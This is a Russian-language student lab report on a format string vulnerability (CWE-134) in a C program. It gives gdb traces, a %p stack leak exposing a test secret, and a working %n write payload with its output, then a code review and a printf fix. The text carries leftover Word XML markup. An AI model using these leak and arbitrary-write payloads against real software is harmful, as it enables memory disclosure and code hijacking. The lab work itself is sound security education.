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Отчёт по практике 6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Бинарные уязвимости: format string, вариант 3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Выполнил: Колесников Андрей Юрьевич, группа БСБО-03-23, студенческий билет 23Б0099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РТУ МИРЭА, Институт кибербезопасности и цифровых технологий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1. Вариант и цель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Номер студенческого билета 23Б0099 заканчивается на 9, поэтому по таблице вариантов взят вариант 3. В нём программа читает файл в буфер, а затем передаёт argv[1] напрямую в printf(). Требовалось провести динамическую отладку, разобрать код и предложить исправление. Уязвимость здесь не переполнение буфера, а управляемая строка формата (CWE-134), но она относится к тому же классу бинарных ошибок: пользовательский ввод меняет поведение машинного кода.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2. Исходный код и сборка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Исходный файл src/vuln_variant3.c взят из методички. Для наглядности в отладчике он собран 32-битным, без PIE и без stack protector:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gcc-12 -m32 -g -O0 -fno-stack-protector -no-pie -z execstack \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -o build/vuln src/vuln_variant3.c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Ключевой фрагмент:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");</w:t>
        <w:br/>
        <w:t>char buffer[32];</w:t>
        <w:br/>
        <w:t>fgets(buffer, sizeof(buffer), secret);</w:t>
        <w:br/>
        <w:t>printf(argv[1]);          // ошибка: ввод стал строкой формата</w:t>
        <w:br/>
        <w:t>fclose(secret);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Файл с «секретом» создаётся в контейнере и содержит строку SECRET{format_string_lab}. Проверок fopen и fgets в исходнике нет — это отдельные дефекты, но главная причина уязвимости в printf.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3. Динамическая отладка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gdb поставлена точка останова на main+92 — непосредственно перед call printf, когда аргумент уже лежит на вершине стека. На первом запуске передан обычный текст AAAA. Видно, что буфер находится по адресу ebp-0x3c и содержит SECRET{format_string_lab}, а указатель FILE* лежит по ebp-0x1c. Строка формата — это argv[1], то есть данные, которые пользователь подал на вход программы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Breakpoint 1 at 0x80491e2: file src/vuln_variant3.c, line 29.</w:t>
        <w:br/>
        <w:t>warning: Error disabling address space randomization: Operation not permitted</w:t>
        <w:br/>
        <w:t>[Thread debugging using libthread_db enabled]</w:t>
        <w:br/>
        <w:t>Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".</w:t>
        <w:br/>
        <w:br/>
        <w:t>Breakpoint 1, 0x080491e2 in main (argc=2, argv=0xfffadca4) at src/vuln_variant3.c:29</w:t>
        <w:br/>
        <w:t>29</w:t>
        <w:tab/>
        <w:t xml:space="preserve">    printf(argv[1]);</w:t>
        <w:br/>
        <w:br/>
        <w:t>=== остановка перед printf, аргумент AAAA ===</w:t>
        <w:br/>
        <w:t>eax            0xfffaed18          -332520</w:t>
        <w:br/>
        <w:t>esp            0xfffadb80          0xfffadb80</w:t>
        <w:br/>
        <w:t>ebp            0xfffadbd8          0xfffadbd8</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- вершина стека: аргумент printf --</w:t>
        <w:br/>
        <w:t>0xfffadb80:</w:t>
        <w:tab/>
        <w:t>0xfffaed18</w:t>
        <w:tab/>
        <w:t>0x00000020</w:t>
        <w:tab/>
        <w:t>0x08af41a0</w:t>
        <w:tab/>
        <w:t>0x0804919e</w:t>
        <w:br/>
        <w:t>-- строка формата --</w:t>
        <w:br/>
        <w:t>0xfffaed18:</w:t>
        <w:tab/>
        <w:t>"AAAA"</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- буфер buffer (ebp-0x3c), туда прочитан файл --</w:t>
        <w:br/>
        <w:t>0xfffadb9c:</w:t>
        <w:tab/>
        <w:t>0x53</w:t>
        <w:tab/>
        <w:t>0x45</w:t>
        <w:tab/>
        <w:t>0x43</w:t>
        <w:tab/>
        <w:t>0x52</w:t>
        <w:tab/>
        <w:t>0x45</w:t>
        <w:tab/>
        <w:t>0x54</w:t>
        <w:tab/>
        <w:t>0x7b</w:t>
        <w:tab/>
        <w:t>0x66</w:t>
        <w:br/>
        <w:t>0xfffadba4:</w:t>
        <w:tab/>
        <w:t>0x6f</w:t>
        <w:tab/>
        <w:t>0x72</w:t>
        <w:tab/>
        <w:t>0x6d</w:t>
        <w:tab/>
        <w:t>0x61</w:t>
        <w:tab/>
        <w:t>0x74</w:t>
        <w:tab/>
        <w:t>0x5f</w:t>
        <w:tab/>
        <w:t>0x73</w:t>
        <w:tab/>
        <w:t>0x74</w:t>
        <w:br/>
        <w:t>0xfffadbac:</w:t>
        <w:tab/>
        <w:t>0x72</w:t>
        <w:tab/>
        <w:t>0x69</w:t>
        <w:tab/>
        <w:t>0x6e</w:t>
        <w:tab/>
        <w:t>0x67</w:t>
        <w:tab/>
        <w:t>0x5f</w:t>
        <w:tab/>
        <w:t>0x6c</w:t>
        <w:tab/>
        <w:t>0x61</w:t>
        <w:tab/>
        <w:t>0x62</w:t>
        <w:br/>
        <w:t>0xfffadbb4:</w:t>
        <w:tab/>
        <w:t>0x7d</w:t>
        <w:tab/>
        <w:t>0x0a</w:t>
        <w:tab/>
        <w:t>0x00</w:t>
        <w:tab/>
        <w:t>0xf7</w:t>
        <w:tab/>
        <w:t>0x4f</w:t>
        <w:tab/>
        <w:t>0x4a</w:t>
        <w:tab/>
        <w:t>0xcc</w:t>
        <w:tab/>
        <w:t>0xf7</w:t>
        <w:br/>
        <w:t>0xfffadbbc:</w:t>
        <w:tab/>
        <w:t>0xa0</w:t>
        <w:tab/>
        <w:t>0x41</w:t>
        <w:tab/>
        <w:t>0xaf</w:t>
        <w:tab/>
        <w:t>0x08</w:t>
        <w:tab/>
        <w:t>0x00</w:t>
        <w:tab/>
        <w:t>0xdc</w:t>
        <w:tab/>
        <w:t>0xfa</w:t>
        <w:tab/>
        <w:t>0xff</w:t>
        <w:br/>
        <w:t>0xfffadb9c:</w:t>
        <w:tab/>
        <w:t>"SECRET{format_string_lab}\n"</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- указатель FILE* secret (ebp-0x1c) --</w:t>
        <w:br/>
        <w:t>0xfffadbbc:</w:t>
        <w:tab/>
        <w:t>0x08af41a0</w:t>
        <w:br/>
        <w:t>warning: Error disabling address space randomization: Operation not permitted</w:t>
        <w:br/>
        <w:t>[Thread debugging using libthread_db enabled]</w:t>
        <w:br/>
        <w:t>Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".</w:t>
        <w:br/>
        <w:br/>
        <w:t>Breakpoint 1, 0x080491e2 in main (argc=2, argv=0xff912c94) at src/vuln_variant3.c:29</w:t>
        <w:br/>
        <w:t>29</w:t>
        <w:tab/>
        <w:t xml:space="preserve">    printf(argv[1]);</w:t>
        <w:br/>
        <w:br/>
        <w:t>=== остановка перед printf, аргумент с %%p ===</w:t>
        <w:br/>
        <w:t>0xff913d05:</w:t>
        <w:tab/>
        <w:t>"%p.%p.%p.%p.%p.%p.%p.%p"</w:t>
        <w:br/>
        <w:t>0x20.0x944d1a0.0x804919e.0xf7febff4.0x2c.(nil).0x52434553.0x667b5445[Inferior 1 (process 28) exited normally]</w:t>
        <w:br/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Второй запуск с %p.%p... показывает, что printf читает аргументы дальше по стеку. Среди значений появляются 0x52434553 и 0x667b5445 — это байты SECR и ET{f из файла. Программа не собиралась печатать секрет, но он оказался в выводе из-за форматной строки. Это уже утечка памяти, а не безобидное эхо.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4. Демонстрация примитивов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Обычный запуск и утечка через %p:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>--- normal ---</w:t>
        <w:br/>
        <w:t>hello</w:t>
        <w:br/>
        <w:t>--- leak ---</w:t>
        <w:br/>
        <w:t>ARGV=0x20 argv2=0x98b41a0 stack3=0x804919e stack4=0xf7f1cff4 stack5=0x2c stack6=(nil) stack7=0x52434553 stack8=0x667b5445</w:t>
        <w:br/>
        <w:t>--- fixed with percent ---</w:t>
        <w:br/>
        <w:t>ARGV=%p argv2=%p %n</w:t>
        <w:br/>
        <w:t>exit=0</w:t>
        <w:br/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записи сделан отдельный стенд format_write_demo.c: он читает строку в стековый буфер и вызывает printf() от неё. В начале строки лежит адрес глобальной переменной target (0x0804c014), а %4$n пишет в неё число уже выведенных символов. Подбор смещения и результаты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload=b'\x14\xc0\x04\x08%62c%4$n\n'  rc=0</w:t>
        <w:br/>
        <w:t>target = 0x00000042</w:t>
        <w:br/>
        <w:t>payload=b'\x14\xc0\x04\x08%66c%4$n\n'  rc=0</w:t>
        <w:br/>
        <w:t>target = 0x00000046</w:t>
        <w:br/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Так %62c%4$n записывает в target значение 0x42, а %66c%4$n — 0x46. Примитив произвольной записи доказан. В реальной программе вместо target можно выбрать адрес возврата или элемент GOT, если позволяют защиты; конкретный эксплойт зависит от сборки libc и включённых механизмов.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5. Код-ревью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Проблема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CWE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Последствие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Ввод передан как строка формата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printf(argv[1])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CWE-134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чтение памяти, запись через %n, падение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проверки argc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CWE-20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обращение к argv[1] при пустом argv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проверки fopen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fopen(...)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CWE-252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fgets(NULL) при отсутствии файла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Секрет хранится в памяти процесса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buffer[32]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CWE-316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утечка через %s/%p или дамп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Отключены защиты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сборка -no-pie -z execstack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CWE-693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упрощает эксплуатацию, но это сделано для лабораторной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Главная ошибка — смешение данных и управляющей строки. printf получает первый аргумент как программу форматирования: %p читает слово со стека, %s разыменовывает указатель, %n записывает число по адресу. Даже если программа не печатает результат, %n может изменить память и привести к выполнению чужого кода. В варианте 3 есть все условия: управляемый первый аргумент, отсутствие проверки формата и полезные данные в памяти.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6. Исправление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Исправление минимальное: строка формата должна быть константой, а ввод — аргументом:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>printf("%s\n", argv[1]);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fixed_variant3.c дополнительно проверяются argc, fopen и fgets. Это не лечит форматную строку (её лечит только %s), но убирает падения при неправильном запуске. Проверка исправленной версии:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ ./build/fixed "ARGV=%p argv2=%p %n"</w:t>
        <w:br/>
        <w:t>ARGV=%p argv2=%p %n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Символы % больше не выполняются. Для реальной сборки нужно также включить -Wformat-security, -D_FORTIFY_SOURCE=2, PIE, stack protector и не отключать ASLR. Это не заменяет исправление, но повышает цену эксплуатации похожих ошибок.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7.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варианте 3 подтверждена format string vulnerability. В gdb видно, что printf получает пользовательский указатель как формат; практические запуски показывают утечку SECRET из буфера и запись 0x42/0x46 в глобальную переменную через %n. Исправление на одну строку (printf("%s", argv[1])) полностью убирает управление форматом, а дополнительные проверки argc, fopen и fgets убирают аварийные ситуации.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Ограничение: ASLR в контейнере полностью отключить не удалось, адреса стека меняются. На демонстрацию это не влияет, потому что смещение %4$n и адрес target фиксированы (сборка -no-pie). Все действия выполнялись в локальном учебном контейнере, файл с секретом — тестовый.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